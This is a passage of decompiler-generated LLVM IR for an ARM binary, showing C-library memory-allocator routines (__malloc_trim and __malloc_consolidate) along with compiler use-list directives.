  uselistorder i32 %v2_260a8, { 2, 1, 0 }
  uselistorder i32 %v2_26090, { 1, 2, 0, 3 }
  uselistorder i32 %v2_26088, { 1, 0, 2 }
  uselistorder i32 %v1_26084, { 2, 1, 0 }
  uselistorder i32 %v0_26084, { 3, 1, 2, 0 }
  uselistorder i32 %v1_26068, { 1, 0 }
  uselistorder i32 %v2_26040, { 1, 0 }
  uselistorder i32 %v3_26034, { 1, 0, 2 }
  uselistorder i32 %v2_26014, { 1, 0, 2 }
  uselistorder i32* %v2_2600c, { 1, 0, 2 }
  uselistorder i32 %v0_25ff4, { 1, 0 }
  uselistorder i32 %v6_25fd0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_25fbc, { 2, 1, 0 }
  uselistorder i32 %v0_25fa4, { 1, 0 }
  uselistorder i32 %v2_25f60, { 1, 0, 2, 3 }
  uselistorder i32 %v1_25f5c, { 1, 0 }
  uselistorder i32 %v3_25f34, { 0, 3, 1, 2, 4, 5 }
  uselistorder i32 %v2_25f14, { 1, 0, 2 }
  uselistorder i32 %v2_25efc, { 1, 2, 0, 3 }
  uselistorder i32 %v1_25ea4, { 2, 1, 0 }
  uselistorder i32 %v6_25e98, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32 %v3_25e74, { 2, 1, 0, 3 }
  uselistorder i32 %v3_25e34, { 1, 0, 2, 3 }
  uselistorder i32 %v0_25df4, { 5, 6, 7, 0, 1, 8, 3, 2, 4, 9 }
  uselistorder i32 %v3_25dec, { 1, 0, 2, 3 }
  uselistorder i32 %v4_25de8, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %v0_25dd4, { 1, 0 }
  uselistorder i32 %v7_25d94, { 1, 0 }
  uselistorder i32 %v4_25d94, { 1, 0 }
  uselistorder i32 %v0_25d64, { 1, 0 }
  uselistorder i32 %v2_25d38, { 3, 2, 1, 0 }
  uselistorder i32 %ip.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_25d3454, { 1, 0 }
  uselistorder i32 %v1_25d00, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v1_25ce8., { 1, 2, 0 }
  uselistorder i32 %v0_25cf0, { 0, 1, 3, 2 }
  uselistorder i32 %v1_25cf0, { 1, 0 }
  uselistorder i32 %v3_25cd0, { 1, 0 }
  uselistorder i32 %v4_25ccc, { 1, 0, 2 }
  uselistorder i32 %v1_25c3c, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_25c94, { 1, 0 }
  uselistorder i32 %v1_25c78, { 1, 0 }
  uselistorder i32 %v1_25b18, { 1, 0 }
  uselistorder i32 %v0_25c58, { 2, 0, 1, 3 }
  uselistorder i32 %v3_25c20, { 2, 0, 1, 3 }
  uselistorder i32 %v0_25cb4.pre, { 1, 2, 0 }
  uselistorder i32 %v0_25bfc, { 2, 1, 0 }
  uselistorder i32 %v3_25bf0, { 5, 6, 4, 3, 2, 0, 1 }
  uselistorder i32 %v0_25b10, { 0, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_25bb8, { 1, 0 }
  uselistorder i32 %v3_25bac, { 1, 0 }
  uselistorder i32 %v0_25bb8, { 1, 0 }
  uselistorder i32 %v3_25b90, { 0, 2, 3, 1 }
  uselistorder i32 %v2_25b80, { 1, 0, 2 }
  uselistorder i32 %v3_25b38, { 2, 1, 0 }
  uselistorder i32 %v0_25b28, { 3, 2, 1, 0 }
  uselistorder i32 %v0_25af8, { 1, 0 }
  uselistorder i32 %v1_25aac, { 2, 1, 0, 3 }
  uselistorder i32 %v0_25aa8, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v3_25a4c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_25a40, { 1, 0 }
  uselistorder i32 %v3_25a10, { 1, 0 }
  uselistorder i32 %v0_25a04, { 5, 6, 4, 2, 0, 3, 1 }
  uselistorder i32 %v2_259e4, { 0, 2, 1, 3 }
  uselistorder i1 %v7_259d8, { 1, 0 }
  uselistorder i32 %v0_259a8, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r4.global-to-local, { 13, 0, 1, 2, 3, 4, 6, 5, 8, 9, 7, 10, 11, 12, 14, 15, 16 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 45, 42, 43, 44, 46, 47, 48, 49, 1, 2, 50, 51, 52, 53, 54, 55, 56, 57, 58, 63, 59, 60, 61, 62, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 83, 91, 78, 79, 80, 81, 82, 84, 85, 86, 87, 0, 88, 89, 90, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 50, 43, 44, 45, 46, 47, 48, 49, 51, 52, 53, 54, 55, 56, 57, 58 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 47, 42, 43, 44, 45, 46, 48, 49, 50, 51, 52, 53, 54, 55 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 30, 3, 5, 6, 7, 19, 11, 8, 20, 9, 10, 13, 12, 17, 14, 21, 16, 15, 22, 18, 26, 24, 23, 25, 28, 27, 31, 29, 35, 32, 33, 1, 34, 36, 37, 38, 39, 42, 43, 40, 41, 48, 45, 44, 46, 47, 49, 54, 50, 51, 52, 53, 56, 55, 59, 58, 57, 0 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 7, 5, 6, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %ip.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 13, 11, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 0, 23, 24, 36, 35, 28, 25, 1, 26, 27, 29, 30, 31, 32, 33, 34, 37, 38, 39, 40, 41, 42 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @mmap, { 1, 0 }
  uselistorder i32 (i32)* @__malloc_largebin_index, { 1, 0 }
  uselistorder label %dec_label_pc_26250, { 1, 0 }
  uselistorder label %dec_label_pc_26234, { 7, 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_26230, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_26218, { 1, 2, 0 }
  uselistorder label %bb168, { 1, 0 }
  uselistorder label %bb166, { 1, 0 }
  uselistorder label %dec_label_pc_261ac, { 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_26128, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_26120, { 1, 0 }
  uselistorder label %bb164, { 1, 0 }
  uselistorder label %.thread44, { 1, 0 }
  uselistorder label %.thread43, { 1, 0 }
  uselistorder label %.thread40, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_25ff4, { 1, 0 }
  uselistorder label %.thread32, { 1, 0 }
  uselistorder label %bb157, { 1, 0 }
  uselistorder label %bb153, { 1, 0 }
  uselistorder label %dec_label_pc_25f28, { 2, 0, 3, 1 }
  uselistorder label %bb150, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
  uselistorder label %.thread27, { 1, 0 }
  uselistorder label %dec_label_pc_25de0, { 0, 2, 1 }
  uselistorder label %.thread121, { 1, 0 }
  uselistorder label %bb144, { 1, 0 }
  uselistorder label %dec_label_pc_25d34, { 1, 0 }
  uselistorder label %dec_label_pc_25d3c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_25d00, { 1, 0 }
  uselistorder label %dec_label_pc_25cb4, { 1, 0 }
  uselistorder label %dec_label_pc_25c48, { 1, 0 }
  uselistorder label %dec_label_pc_25c44, { 1, 0 }
  uselistorder label %dec_label_pc_25bf0, { 1, 0 }
  uselistorder label %dec_label_pc_25bdc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_25ba4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_25b90, { 1, 0 }
  uselistorder label %bb140, { 1, 0 }
  uselistorder label %bb138, { 1, 0 }
}

define i32 @function_26264(i32 %arg1) local_unnamed_addr {
dec_label_pc_26264:
  %v0_26264 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_26264, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_26264
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_26264, %bb
  %v10_26280 = phi i32 [ %arg1, %dec_label_pc_26264 ], [ 0, %bb ]
  ret i32 %v10_26280

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @__malloc_trim(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v1_26284 = add i32 %arg2, 44
  %v2_26284 = inttoptr i32 %v1_26284 to i32*
  %v3_26284 = load i32, i32* %v2_26284, align 4
  %v12_26288 = load i32, i32* @r7, align 4
  %v1_2628c = add i32 %v3_26284, 4
  %v2_2628c = inttoptr i32 %v1_2628c to i32*
  %v3_2628c = load i32, i32* %v2_2628c, align 4
  %v1_26290 = add i32 %arg2, 860
  %v2_26290 = inttoptr i32 %v1_26290 to i32*
  %v3_26290 = load i32, i32* %v2_26290, align 4
  store i32 %v3_26290, i32* @r4, align 4
  %v1_26294 = and i32 %v3_2628c, -4
  store i32 %v1_26294, i32* @r6, align 4
  %v1_26298 = add i32 %v1_26294, -17
  %v2_2629c = add i32 %v1_26298, %v3_26290
  store i32 %arg2, i32* @r5, align 4
  %v2_262a8 = sub i32 %v2_2629c, %arg1
  store i32 %v3_26290, i32* %r1.global-to-local, align 4
  %v2_262b0 = udiv i32 %v2_262a8, %v3_26290
  %v1_262b4 = add i32 %v2_262b0, -1
  store i32 %v1_262b4, i32* %r0.global-to-local, align 4
  %v2_262b8 = mul i32 %v1_262b4, %v3_26290
  store i32 %v2_262b8, i32* @r7, align 4
  %v2_262bc = icmp eq i32 %v2_262b8, 0
  store i1 %v2_262bc, i1* @cpsr_z, align 1
  %tmp8 = icmp slt i32 %v2_262b8, 1
  br i1 %tmp8, label %dec_label_pc_26324, label %dec_label_pc_262c4

dec_label_pc_262c4:                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_262c8 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_262c8, i32* %r0.global-to-local, align 4
  %v0_262cc = load i32, i32* @r5, align 4
  %v1_262cc = add i32 %v0_262cc, 44
  %v2_262cc = inttoptr i32 %v1_262cc to i32*
  %v3_262cc = load i32, i32* %v2_262cc, align 4
  %v0_262d0 = load i32, i32* @r6, align 4
  %v2_262d0 = add i32 %v0_262d0, %v3_262cc
  %v9_262d4 = icmp eq i32 %v1_262c8, %v2_262d0
  store i1 %v9_262d4, i1* @cpsr_z, align 1
  store i32 %v1_262c8, i32* @r4, align 4
  br i1 %v9_262d4, label %dec_label_pc_262e0, label %dec_label_pc_26324

dec_label_pc_262e0:                               ; preds = %dec_label_pc_262c4
  %v0_262e0 = load i32, i32* @r7, align 4
  %v1_262e0 = sub i32 0, %v0_262e0
  store i32 %v1_262e0, i32* %r0.global-to-local, align 4
  %v1_262e4 = call i32 @__GI_sbrk(i32 %v1_262e0)
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_262ec = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_262ec, i32* %r0.global-to-local, align 4
  %v7_262f0 = icmp eq i32 %v1_262ec, -1
  store i1 %v7_262f0, i1* @cpsr_z, align 1
  br i1 %v7_262f0, label %dec_label_pc_26324, label %dec_label_pc_262f8

dec_label_pc_262f8:                               ; preds = %dec_label_pc_262e0
  %v0_262f8 = load i32, i32* @r4, align 4
  %v2_262f8 = sub i32 %v0_262f8, %v1_262ec
  store i32 %v2_262f8, i32* %r0.global-to-local, align 4
  %v9_262f8 = icmp eq i32 %v0_262f8, %v1_262ec
  store i1 %v9_262f8, i1* @cpsr_z, align 1
  br i1 %v9_262f8, label %dec_label_pc_26324, label %dec_label_pc_26300

dec_label_pc_26300:                               ; preds = %dec_label_pc_262f8
  %v0_26300 = load i32, i32* @r5, align 4
  %v1_26300 = add i32 %v0_26300, 872
  %v2_26300 = inttoptr i32 %v1_26300 to i32*
  %v3_26300 = load i32, i32* %v2_26300, align 4
  %v1_26304 = load i32, i32* @r6, align 4
  %v2_26304 = sub i32 %v1_26304, %v2_262f8
  %v1_26308 = add i32 %v0_26300, 44
  %v2_26308 = inttoptr i32 %v1_26308 to i32*
  %v3_26308 = load i32, i32* %v2_26308, align 4
  store i32 %v3_26308, i32* %r1.global-to-local, align 4
  %v2_2630c = sub i32 %v3_26300, %v2_262f8
  %v1_26310 = or i32 %v2_26304, 1
  store i32 %v1_26310, i32* @r2, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v2_2630c, i32* %v2_26300, align 4
  %v0_2631c = load i32, i32* @r2, align 4
  %v1_2631c = load i32, i32* %r1.global-to-local, align 4
  %v2_2631c = add i32 %v1_2631c, 4
  %v3_2631c = inttoptr i32 %v2_2631c to i32*
  store i32 %v0_2631c, i32* %v3_2631c, align 4
  %v1_26330.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_26328

dec_label_pc_26324:                               ; preds = %dec_label_pc_262c4, %dec_label_pc_262f8, %dec_label_pc_262e0, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_26328

dec_label_pc_26328:                               ; preds = %dec_label_pc_26300, %dec_label_pc_26324
  %v1_26330 = phi i32 [ %v1_26330.pre, %dec_label_pc_26300 ], [ 0, %dec_label_pc_26324 ]
  store i32 %v12_26288, i32* @r7, align 4
  ret i32 %v1_26330

; uselistorder directives
  uselistorder i1 %v7_262f0, { 1, 0 }
  uselistorder i32 %v1_262ec, { 2, 1, 0, 3 }
  uselistorder i32 %v3_26290, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 10, 9, 8, 0 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_26328, { 1, 0 }
  uselistorder label %dec_label_pc_26324, { 1, 2, 0, 3 }
}

define i32 @__malloc_consolidate() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_26334 = load i32, i32* @r4, align 4
  store i32 %v3_26334, i32* %stack_var_-36, align 4
  %v0_26338 = load i32, i32* @r0, align 4
  %v1_26338 = inttoptr i32 %v0_26338 to i32*
  %v2_26338 = load i32, i32* %v1_26338, align 4
  store i32 %v2_26338, i32* %r3.global-to-local, align 4
  %v2_2633c = icmp eq i32 %v2_26338, 0
  store i32 %v0_26338, i32* @r4, align 4
  br i1 %v2_2633c, label %dec_label_pc_26474.preheader, label %dec_label_pc_26350

dec_label_pc_26474.preheader:                     ; preds = %entry
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_2647c25 = add i32 %v0_26338, 52
  store i32 %v1_2647c25, i32* %r3.global-to-local, align 4
  %v2_2648426 = add i32 %v0_26338, 60
  %v3_2648427 = inttoptr i32 %v2_2648426 to i32*
  store i32 %v1_2647c25, i32* %v3_2648427, align 4
  %v0_2648828 = load i32, i32* %r3.global-to-local, align 4
  %v2_2648829 = add i32 %v0_2648828, 12
  %v3_2648830 = inttoptr i32 %v2_2648829 to i32*
  store i32 %v0_2648828, i32* %v3_2648830, align 4
  br label %dec_label_pc_26474.dec_label_pc_26474_crit_edge

dec_label_pc_26350:                               ; preds = %entry
  %v1_26350 = and i32 %v2_26338, -3
  %v3_26354 = udiv i32 %v2_26338, 8
  store i32 %v3_26354, i32* %r2.global-to-local, align 4
  store i32 %v1_26350, i32* %v1_26338, align 4
  %v0_2635c = load i32, i32* @r0, align 4
  %v1_2635c = add i32 %v0_2635c, -4
  store i32 %v1_2635c, i32* %r3.global-to-local, align 4
  %v1_26360 = load i32, i32* %r2.global-to-local, align 4
  %v4_26360 = mul i32 %v1_26360, 4
  %v5_26360 = add i32 %v4_26360, %v1_2635c
  store i32 %v5_26360, i32* %sb.global-to-local, align 4
  %v1_26364 = add i32 %v0_2635c, 52
  store i32 %v1_26364, i32* %r7.global-to-local, align 4
  %v1_26368 = add i32 %v0_2635c, 4
  store i32 %v1_26368, i32* %r6.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_26370

dec_label_pc_26370:                               ; preds = %dec_label_pc_2646c, %dec_label_pc_26350
  %v1_2646410 = phi i32 [ %v1_26464, %dec_label_pc_2646c ], [ %v5_26360, %dec_label_pc_26350 ]
  %v1_2637c = phi i32 [ %v1_2646c, %dec_label_pc_2646c ], [ %v1_26368, %dec_label_pc_26350 ]
  %v1_26370 = inttoptr i32 %v1_2637c to i32*
  %v2_26370 = load i32, i32* %v1_26370, align 4
  store i32 %v2_26370, i32* %r1.global-to-local, align 4
  %v2_26374 = icmp eq i32 %v2_26370, 0
  br i1 %v2_26374, label %dec_label_pc_26464, label %dec_label_pc_2637c

dec_label_pc_2637c:                               ; preds = %dec_label_pc_26370
  %v0_2637c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_2637c, i32* %v1_26370, align 4
  %v0_26380.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_26380

dec_label_pc_26380:                               ; preds = %dec_label_pc_26458, %dec_label_pc_2637c
  %v0_2639c = phi i32 [ %v0_26458, %dec_label_pc_26458 ], [ %v0_26380.pre, %dec_label_pc_2637c ]
  %v1_26380 = add i32 %v0_2639c, 4
  %v2_26380 = inttoptr i32 %v1_26380 to i32*
  %v3_26380 = load i32, i32* %v2_26380, align 4
  store i32 %v3_26380, i32* %r3.global-to-local, align 4
  %v1_26384 = and i32 %v3_26380, -2
  store i32 %v1_26384, i32* %lr.global-to-local, align 4
  %v2_26388 = add i32 %v1_26384, %v0_2639c
  store i32 %v2_26388, i32* @r0, align 4
  %v1_2638c = urem i32 %v3_26380, 2
  %v2_2638c = icmp eq i32 %v1_2638c, 0
  %v1_26390 = add i32 %v0_2639c, 8
  %v2_26390 = inttoptr i32 %v1_26390 to i32*
  %v3_26390 = load i32, i32* %v2_26390, align 4
  store i32 %v3_26390, i32* %sl.global-to-local, align 4
  %v1_26394 = add i32 %v2_26388, 4
  %v2_26394 = inttoptr i32 %v1_26394 to i32*
  %v3_26394 = load i32, i32* %v2_26394, align 4
  store i32 %v3_26394, i32* %r8.global-to-local, align 4
  br i1 %v2_2638c, label %dec_label_pc_2639c, label %dec_label_pc_263d0

dec_label_pc_2639c:                               ; preds = %dec_label_pc_26380
  %v1_2639c = inttoptr i32 %v0_2639c to i32*
  %v2_2639c = load i32, i32* %v1_2639c, align 4
  store i32 %v2_2639c, i32* %r5.global-to-local, align 4
  %v2_263a0 = sub i32 %v0_2639c, %v2_2639c
  store i32 %v2_263a0, i32* %r3.global-to-local, align 4
  %v1_263a4 = add i32 %v2_263a0, 8
  %v2_263a4 = inttoptr i32 %v1_263a4 to i32*
  %v3_263a4 = load i32, i32* %v2_263a4, align 4
  store i32 %v3_263a4, i32* %ip.global-to-local, align 4
  %v1_263a8 = add i32 %v3_263a4, 12
  %v2_263a8 = inttoptr i32 %v1_263a8 to i32*
  %v3_263a8 = load i32, i32* %v2_263a8, align 4
  store i32 %v3_263a8, i32* %r1.global-to-local, align 4
  %v9_263ac = icmp eq i32 %v3_263a8, %v2_263a0
  %v1_263b0 = add i32 %v2_263a0, 12
  %v2_263b0 = inttoptr i32 %v1_263b0 to i32*
  %v3_263b0 = load i32, i32* %v2_263b0, align 4
  store i32 %v3_263b0, i32* %r2.global-to-local, align 4
  br i1 %v9_263ac, label %dec_label_pc_263b8, label %dec_label_pc_26414

dec_label_pc_263b8:                               ; preds = %dec_label_pc_2639c
  %v1_263b8 = add i32 %v3_263b0, 8
  %v2_263b8 = inttoptr i32 %v1_263b8 to i32*
  %v3_263b8 = load i32, i32* %v2_263b8, align 4
  store i32 %v3_263b8, i32* %r3.global-to-local, align 4
  %v9_263bc = icmp eq i32 %v3_263b8, %v2_263a0
  br i1 %v9_263bc, label %dec_label_pc_263c4, label %dec_label_pc_26414

dec_label_pc_263c4:                               ; preds = %dec_label_pc_263b8
  store i32 %v3_263a4, i32* %v2_263b8, align 4
  %v0_263c8 = load i32, i32* %r2.global-to-local, align 4
  %v1_263c8 = load i32, i32* %ip.global-to-local, align 4
  %v2_263c8 = add i32 %v1_263c8, 12
  %v3_263c8 = inttoptr i32 %v2_263c8 to i32*
  store i32 %v0_263c8, i32* %v3_263c8, align 4
  %v0_263cc = load i32, i32* %lr.global-to-local, align 4
  %v1_263cc = load i32, i32* %r5.global-to-local, align 4
  %v2_263cc = add i32 %v1_263cc, %v0_263cc
  store i32 %v2_263cc, i32* %lr.global-to-local, align 4
  %v0_263d4.pre = load i32, i32* @r0, align 4
  %v0_263d8.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_263d0

dec_label_pc_263d0:                               ; preds = %dec_label_pc_26380, %dec_label_pc_263c4
  %v0_26448 = phi i32 [ %v1_26384, %dec_label_pc_26380 ], [ %v2_263cc, %dec_label_pc_263c4 ]
  %v0_263d8 = phi i32 [ %v3_26394, %dec_label_pc_26380 ], [ %v0_263d8.pre, %dec_label_pc_263c4 ]
  %v1_263ec = phi i32 [ %v2_26388, %dec_label_pc_26380 ], [ %v0_263d4.pre, %dec_label_pc_263c4 ]
  %v0_263d0 = load i32, i32* @r4, align 4
  %v1_263d0 = add i32 %v0_263d0, 44
  %v2_263d0 = inttoptr i32 %v1_263d0 to i32*
  %v3_263d0 = load i32, i32* %v2_263d0, align 4
  store i32 %v3_263d0, i32* %r3.global-to-local, align 4
  %v9_263d4 = icmp eq i32 %v1_263ec, %v3_263d0
  %v1_263d8 = and i32 %v0_263d8, -4
  store i32 %v1_263d8, i32* %r5.global-to-local, align 4
  br i1 %v9_263d4, label %dec_label_pc_26448, label %dec_label_pc_263e0

dec_label_pc_263e0:                               ; preds = %dec_label_pc_263d0
  %v2_263e0 = add i32 %v1_263ec, %v1_263d8
  store i32 %v2_263e0, i32* %r3.global-to-local, align 4
  %v1_263e4 = add i32 %v2_263e0, 4
  %v2_263e4 = inttoptr i32 %v1_263e4 to i32*
  %v3_263e4 = load i32, i32* %v2_263e4, align 4
  store i32 %v3_263e4, i32* %r3.global-to-local, align 4
  %v1_263e8 = urem i32 %v3_263e4, 2
  %v2_263e8 = icmp eq i32 %v1_263e8, 0
  %v2_263ec = add i32 %v1_263ec, 4
  %v3_263ec = inttoptr i32 %v2_263ec to i32*
  store i32 %v1_263d8, i32* %v3_263ec, align 4
  br i1 %v2_263e8, label %dec_label_pc_263f4, label %dec_label_pc_263e0.dec_label_pc_26424_crit_edge

dec_label_pc_263e0.dec_label_pc_26424_crit_edge:  ; preds = %dec_label_pc_263e0
  %v0_26428.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_26424

dec_label_pc_263f4:                               ; preds = %dec_label_pc_263e0
  %v0_263f4 = load i32, i32* @r0, align 4
  %v1_263f4 = add i32 %v0_263f4, 8
  %v2_263f4 = inttoptr i32 %v1_263f4 to i32*
  %v3_263f4 = load i32, i32* %v2_263f4, align 4
  store i32 %v3_263f4, i32* %ip.global-to-local, align 4
  %v1_263f8 = add i32 %v3_263f4, 12
  %v2_263f8 = inttoptr i32 %v1_263f8 to i32*
  %v3_263f8 = load i32, i32* %v2_263f8, align 4
  store i32 %v3_263f8, i32* %r3.global-to-local, align 4
  %v9_263fc = icmp eq i32 %v3_263f8, %v0_263f4
  %v1_26400 = add i32 %v0_263f4, 12
  %v2_26400 = inttoptr i32 %v1_26400 to i32*
  %v3_26400 = load i32, i32* %v2_26400, align 4
  store i32 %v3_26400, i32* %r2.global-to-local, align 4
  br i1 %v9_263fc, label %dec_label_pc_26408, label %dec_label_pc_26414

dec_label_pc_26408:                               ; preds = %dec_label_pc_263f4
  %v1_26408 = add i32 %v3_26400, 8
  %v2_26408 = inttoptr i32 %v1_26408 to i32*
  %v3_26408 = load i32, i32* %v2_26408, align 4
  store i32 %v3_26408, i32* %r3.global-to-local, align 4
  %v9_2640c = icmp eq i32 %v3_26408, %v0_263f4
  br i1 %v9_2640c, label %dec_label_pc_26418, label %dec_label_pc_26414

dec_label_pc_26414:                               ; preds = %dec_label_pc_263f4, %dec_label_pc_263b8, %dec_label_pc_2639c, %dec_label_pc_26408
  %v0_26414 = call i32 @abort()
  store i32 %v0_26414, i32* @r0, align 4
  %v0_26418.pre = load i32, i32* @ip, align 4
  %v1_26418.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_26418

dec_label_pc_26418:                               ; preds = %dec_label_pc_26408, %dec_label_pc_26414
  %v1_26418 = phi i32 [ %v3_26400, %dec_label_pc_26408 ], [ %v1_26418.pre, %dec_label_pc_26414 ]
  %v0_26418 = phi i32 [ %v3_263f4, %dec_label_pc_26408 ], [ %v0_26418.pre, %dec_label_pc_26414 ]
  %v2_26418 = add i32 %v1_26418, 8
  %v3_26418 = inttoptr i32 %v2_26418 to i32*
  store i32 %v0_26418, i32* %v3_26418, align 4
  %v0_2641c = load i32, i32* %r2.global-to-local, align 4
  %v1_2641c = load i32, i32* %ip.global-to-local, align 4
  %v2_2641c = add i32 %v1_2641c, 12
  %v3_2641c = inttoptr i32 %v2_2641c to i32*
  store i32 %v0_2641c, i32* %v3_2641c, align 4
  %v0_26420 = load i32, i32* %lr.global-to-local, align 4
  %v1_26420 = load i32, i32* %r5.global-to-local, align 4
  %v2_26420 = add i32 %v1_26420, %v0_26420
  store i32 %v2_26420, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_26424

dec_label_pc_26424:                               ; preds = %dec_label_pc_263e0.dec_label_pc_26424_crit_edge, %dec_label_pc_26418
  %v0_26428 = phi i32 [ %v0_26428.pre, %dec_label_pc_263e0.dec_label_pc_26424_crit_edge ], [ %v2_26420, %dec_label_pc_26418 ]
  %v0_26424 = load i32, i32* %r7.global-to-local, align 4
  %v1_26424 = add i32 %v0_26424, 8
  %v2_26424 = inttoptr i32 %v1_26424 to i32*
  %v3_26424 = load i32, i32* %v2_26424, align 4
  store i32 %v3_26424, i32* %r2.global-to-local, align 4
  %v1_26428 = or i32 %v0_26428, 1
  store i32 %v1_26428, i32* %r3.global-to-local, align 4
  %v0_2642c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_2642c, i32* %v2_26424, align 4
  %v0_26430 = load i32, i32* %r1.global-to-local, align 4
  %v1_26430 = load i32, i32* %r2.global-to-local, align 4
  %v2_26430 = add i32 %v1_26430, 12
  %v3_26430 = inttoptr i32 %v2_26430 to i32*
  store i32 %v0_26430, i32* %v3_26430, align 4
  %v0_26434 = load i32, i32* %lr.global-to-local, align 4
  %v1_26434 = load i32, i32* %r1.global-to-local, align 4
  %v3_26434 = add i32 %v1_26434, %v0_26434
  %v4_26434 = inttoptr i32 %v3_26434 to i32*
  store i32 %v0_26434, i32* %v4_26434, align 4
  %v0_26438 = load i32, i32* %r3.global-to-local, align 4
  %v1_26438 = load i32, i32* %r1.global-to-local, align 4
  %v2_26438 = add i32 %v1_26438, 4
  %v3_26438 = inttoptr i32 %v2_26438 to i32*
  store i32 %v0_26438, i32* %v3_26438, align 4
  %v0_2643c = load i32, i32* %r2.global-to-local, align 4
  %v1_2643c = load i32, i32* %r1.global-to-local, align 4
  %v2_2643c = add i32 %v1_2643c, 8
  %v3_2643c = inttoptr i32 %v2_2643c to i32*
  store i32 %v0_2643c, i32* %v3_2643c, align 4
  %v0_26440 = load i32, i32* %r7.global-to-local, align 4
  %v1_26440 = load i32, i32* %r1.global-to-local, align 4
  %v2_26440 = add i32 %v1_26440, 12
  %v3_26440 = inttoptr i32 %v2_26440 to i32*
  store i32 %v0_26440, i32* %v3_26440, align 4
  br label %dec_label_pc_26458

dec_label_pc_26448:                               ; preds = %dec_label_pc_263d0
  %v2_26448 = add i32 %v1_263d8, %v0_26448
  %v1_2644c = or i32 %v2_26448, 1
  store i32 %v1_2644c, i32* %r3.global-to-local, align 4
  %v1_26450 = load i32, i32* %r1.global-to-local, align 4
  %v2_26450 = add i32 %v1_26450, 4
  %v3_26450 = inttoptr i32 %v2_26450 to i32*
  store i32 %v1_2644c, i32* %v3_26450, align 4
  %v0_26454 = load i32, i32* %r1.global-to-local, align 4
  %v1_26454 = load i32, i32* @r4, align 4
